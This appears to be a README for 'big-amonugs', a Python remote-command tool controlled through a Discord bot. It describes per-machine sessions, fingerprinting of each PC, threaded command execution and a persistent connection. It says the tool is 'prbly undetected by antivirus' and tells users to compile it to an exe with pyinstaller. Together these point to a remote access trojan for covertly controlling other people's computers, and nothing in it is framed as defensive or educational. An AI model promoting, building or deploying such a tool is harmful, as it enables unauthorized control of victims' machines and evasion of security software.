# big-amonugs
upgraded version of small-amongus. 

## upgrades from small amongus
all commands are executed in a seperate thread, meaning you can't block the program and you can run multiple command at the same time

stable connection that doesn't close

create session for each PC separately, if you want a pc named x to run a command first +@x then any future messages will be executed, to close a session use -@x

each pc name is hashed with a random number and saved as that pc's id, meaning you can differentiate between different pc's with the same username

prbly undetected by antivirus since there is no explicitly malicous code in source

faster response time

## usage
register a bot on the discord developer portal, replace line 5 & 6 with your token and channel id. 

run `python3 big-amonugs.pyw` or transcompile it to an exe using pyinstaller or something
